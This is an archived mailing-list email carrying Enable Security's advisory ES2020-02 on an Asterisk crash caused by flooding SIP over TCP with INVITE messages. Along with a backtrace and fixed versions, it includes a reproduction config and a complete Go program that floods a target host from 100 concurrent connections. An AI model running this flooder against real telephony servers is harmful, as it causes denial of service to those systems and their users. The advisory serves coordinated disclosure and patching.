X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6446" "Friday" "6" "November" "2020" "11:16:38" "+0100" "Sandro Gauci" "sandro@enablesecurity.com" "<cf14973c-e636-444c-b08c-189a7c07e2ca@www.fastmail.com>" "199" "[oss-security] Advisory: ES2020-02 - Asterisk crash due to INVITE flood over TCP" nil nil nil "11" "2020110610:16:38" "[oss-security] Advisory: ES2020-02 - Asterisk crash due to INVITE flood over TCP" (number mark "U       sandro@enabl Nov  6  199/6446  " thread-indent "\"[oss-security] Advisory: ES2020-02 - Asterisk crash due to INVITE flood over TCP\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Advisory: ES2020-02 - Asterisk crash due to INVITE flood over TCP" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 2018 invoked by uid 550); 6 Nov 2020 10:35:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 23886 invoked from network); 6 Nov 2020 10:17:20 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=mime-version:message-id:date:from:to
	:subject:content-type; s=fm1; bh=/xvvs95V+BnXlb5CA8sW3E3U0TJmLI6
	3B2eExqeF/nE=; b=Wl85jGh5t8o+1v5SGLm0Yi27NAJAkvwyQMzWhIlm2pZT2ME
	3WEWw2nU9fpvfnCDDJSvsNPetf/PRrt0y3tdXpZCG9KNOsvrvfSqisNe3pRvouGg
	0vIxh9ocM+b/M4/lL393VxDsDRiHWqRWX0Hs1cG3QYvpRKuq4oRIFQfSMwJto6Cy
	HZ12ko2UzZZg68x3lcpD569r+//Bqbz4MpL9Qg+OyE7CMl3dQrqHMqvCbYd6fMNT
	bMD3vk5L9amaByb6nJOCxGCwIa1DIjncFT2CCXhbF5/au0ns+k7x94OKzZsnrQnG
	txhcVi8ml5J3uzI86zumKsy9wH4gjmeXraMmwjg==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
	:x-me-sender:x-sasl-enc; s=fm1; bh=/xvvs95V+BnXlb5CA8sW3E3U0TJmL
	I63B2eExqeF/nE=; b=E9EEIc9Rdl3cQvUXhiKhC0CxD8KgXI6qlk/wy923XJMX8
	Wy7v2uw9aVtZghyoMi/LJS4e009r+SbjN/2aFvfS+r1JlRip5vmqFRszYZ/q+/De
	MJyyQHCNoixDix4rZ6fMPPp0oWmU7bLVEbf/Rl3pMWIncBDyCi3QMoaURw2svRS8
	EfK/cgnth5i+nxsIz38Z5kWzdK9L2wK9gv+GuMc2R7wE9UOuAzFyK+mG/En6c2yb
	kn0YFiTpLJVy28ZKCRTd9gaX1jHfE67lDY5qLcdumibqu+kQjxFnqSMhPrijUFrp
	AizaoxAT1bfkYgBALbVhFn5b1Ga+YOvS6q+i7NoOQ==
X-ME-Sender: <xms:oyKlXzpJ7IvDVlka7MoAa42HLuqbl6b4c7But_pNtJGCazHyexdAog>
    <xme:oyKlX9pl0_LpmnZA_zlBA2oxOiokyCz8D85wlMhSW6lBxxyaHmHnbbNQkxvoM_QTE
    K2mXd2SvwwMFH_wFA>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedujedruddtledgudehucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpefftdegudethe
    elgffhudekieetgedtteekuedtueejheejtdffgefhfeeigeehueenucffohhmrghinhep
    ghhithhhuhgsrdgtohhmpdgrshhtvghrihhskhdrohhrghdpvghnrggslhgvshgvtghurh
    hithihrdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghilhhf
    rhhomhepshgrnhgurhhosegvnhgrsghlvghsvggtuhhrihhthidrtghomh
X-ME-Proxy: <xmx:oyKlXwOS3DkbU_j9omj2tp2a5B9y4uO4kxrAA5Z-25QtXeohsQ5lkw>
    <xmx:oyKlX25JwEdGFThD7xkImOti0qca4HG_J7EcmZbG3bHU1c8LstLWhw>
    <xmx:oyKlXy7cg6BMigl5nRegFGMSda3Y9lX5UVRX9YTidWO6qfYPlEfczQ>
    <xmx:oyKlX93RhLr7uIj47gk75tiewSkXGICXLFdRu5Isaf3Bjalxpe73Tw>
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.3.0-570-gba0a262-fm-20201106.001-gba0a2623
Mime-Version: 1.0
Message-Id: <cf14973c-e636-444c-b08c-189a7c07e2ca@www.fastmail.com>
Date: Fri, 06 Nov 2020 11:16:38 +0100
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain
Subject: [oss-security] Advisory: ES2020-02 - Asterisk crash due to INVITE flood over TCP

# Asterisk crash due to INVITE flood over TCP

- Fixed versions: 13.37.1, 16.14.1, 17.8.1, 18.0.1
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2020-02-asterisk-tcp-invite-crash
- Asterisk Security Advisory: https://downloads.asterisk.org/pub/security/AST-2020-001.html
- Tested vulnerable versions: 17.5.1, 17.6.0
- Timeline:
    - Report date: 2020-08-31
	- Triaged: 2020-09-01
	- Fix provided for testing: 2020-10-29
	- Asterisk release with fix: 2020-11-05
	- Enable Security advisory: 2020-11-06

## Description

When an Asterisk instance is flooded with INVITE messages over TCP, it was observed that after some time Asterisk crashes due to a segmentation fault. The backtrace generated after the crash is:

```
3276        PJ_ASSERT_RETURN((cseq=(pjsip_cseq_hdr*)pjsip_msg_find_hdr(tdata->msg, PJSIP_H_CSEQ, NULL))!=NULL
(gdb) bt
#0  0x00007ffff7df1b80 in pjsip_inv_send_msg (inv=0x7fffc88aa5a8, tdata=0x7fffa706a6d8) at ../src/pjsip-ua/sip_inv.c:3276
#1  0x00007ffff4623c41 in ast_sip_session_send_response (session=0x7fffc88ab9f0, tdata=0x7fffa706a6d8) at res_pjsip_session.c:1917
#2  0x00007ffff4627b6b in new_invite (invite=0x7fff94eccb60) at res_pjsip_session.c:3253
#3  0x00007ffff462815b in handle_new_invite_request (rdata=0x7fffa61ec608) at res_pjsip_session.c:3382
#4  0x00007ffff462833d in session_on_rx_request (rdata=0x7fffa61ec608) at res_pjsip_session.c:3446
#5  0x00007ffff7e190ec in pjsip_endpt_process_rx_data (endpt=0x5555559c9d18, rdata=0x7fffa61ec608, p=0x7ffff47c66a0 <param>, p_handled=0x7fff94eccc6c) at ../src/pjsip/sip_endpoint.c:930
#6  0x00007ffff47922a1 in distribute (data=0x7fffa61ec608) at res_pjsip/pjsip_distributor.c:955
#7  0x000055555574c7e1 in ast_taskprocessor_execute (tps=0x555555bb5a80) at taskprocessor.c:1237
#8  0x0000555555756dc7 in execute_tasks (data=0x555555bb5a80) at threadpool.c:1354
#9  0x000055555574c7e1 in ast_taskprocessor_execute (tps=0x5555559c8040) at taskprocessor.c:1237
#10 0x0000555555754698 in threadpool_execute (pool=0x5555559c6070) at threadpool.c:367
#11 0x000055555575655d in worker_active (worker=0x7fff98003e50) at threadpool.c:1137
#12 0x00005555557562bb in worker_start (arg=0x7fff98003e50) at threadpool.c:1056
#13 0x00005555557604ad in dummy_start (data=0x7fffa41fb6e0) at utils.c:1249
#14 0x00007ffff764e609 in start_thread (arg=<optimized out>) at pthread_create.c:477
#15 0x00007ffff728b103 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
```

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when SIP over TCP is in use.

## How to reproduce the issue

The following `pjsip.conf` configuration file was used to facilitate the reproduction of this issue:

```
[global]
debug=yes

[transport-tcp]
type = transport
protocol = tcp
bind = 0.0.0.0

[anonymous]
type = endpoint
context = anon
allow = all
```

The following code in Go can be used to reproduce this issue:

```go
package main

import (
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"
)

const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randstr(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

type loop struct {
	host   string
	port   int
	conn   net.Conn
	invite []byte
	cseq   int
}

func (l *loop) start() {
	sdp := "v=0\r\n"
	sdp += "o=- 1598350717 1598350717 IN IP4 192.168.1.112\r\n"
	sdp += "s=-\r\n"
	sdp += "c=IN IP4 192.168.1.112\r\n"
	sdp += "t=0 0\r\n"
	sdp += "m=audio 9999 RTP/AVP 0\r\n"
	sdp += "a=rtpmap:0 PCMU/8000/1\r\n"
	sdp += "a=sendrecv\r\n"

	invite := "INVITE sip:5cb49ced@127.0.0.1:5060 SIP/2.0\r\n"
	invite += "Via: SIP/2.0/UDP 192.168.1.112:44896;rport;branch=z9hG4bK-_BRANCH_\r\n"
	invite += "Max-Forwards: 70\r\n"
	invite += "From: <sip:5cb49ced@127.0.0.1:5060>;tag=2k309f\r\n"
	invite += "To: <sip:5cb49ced@127.0.0.1:5060>\r\n"
	invite += "Call-ID: 2345908ux\r\n"
	invite += "CSeq: _CSEQ_ INVITE\r\n"
	invite += "Contact: <sip:5cb49ced@192.168.1.112:44896;transport=udp>\r\n"
	invite += fmt.Sprintf("Content-Length: %d\r\n", len(sdp))
	invite += "Content-Type: application/sdp\r\n"
	invite += "\r\n"
	invite += sdp

	l.invite = []byte(invite)

	var err error
	l.conn, err = net.DialTimeout("tcp4", fmt.Sprintf("%s:%d", l.host, l.port), 5*time.Second)
	if err != nil {
		fmt.Println(err.Error())
		time.Sleep(10 * time.Millisecond)
		go l.start()
		return
	}

	if l.conn != nil {
		l.run()
	} else {
		time.Sleep(10 * time.Millisecond)
		go l.start()
	}
}

func (l *loop) run() {
	if err := l.conn.SetWriteDeadline(time.Now().Add(10 * time.Millisecond)); err != nil {
		if strings.Contains(err.Error(), "use of closed network connection") {
			l.start()
		}

	}

	var err error
	for {
		l.cseq++
		inv := l.invite
		inv = bytes.ReplaceAll(inv, []byte("_BRANCH_"), []byte(randstr(8)))
		inv = bytes.ReplaceAll(inv, []byte("_CSEQ_"), []byte(strconv.Itoa(l.cseq)))

		if _, err = l.conn.Write(inv); err != nil {
			go l.start()
			return
		}
	}
}

func main() {
	var port = flag.Int("p", 5060, "Port")
	var host = flag.String("h", "127.0.0.1", "Host")
	flag.Parse()

	for i := 0; i < 100; i++ {
		go func() {
			l := loop{
				host: *host,
				port: *port,
			}
			l.start()
		}()
	}
	select {}
}
```

## Solution and recommendations

Apply the patch provided by Asterisk or upgrade to a fixed version.

Enable Security would like to thank Kevin Harwell, Joshua C. Colp and the staff at Asterisk for the very quick response and fixing this security issue.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

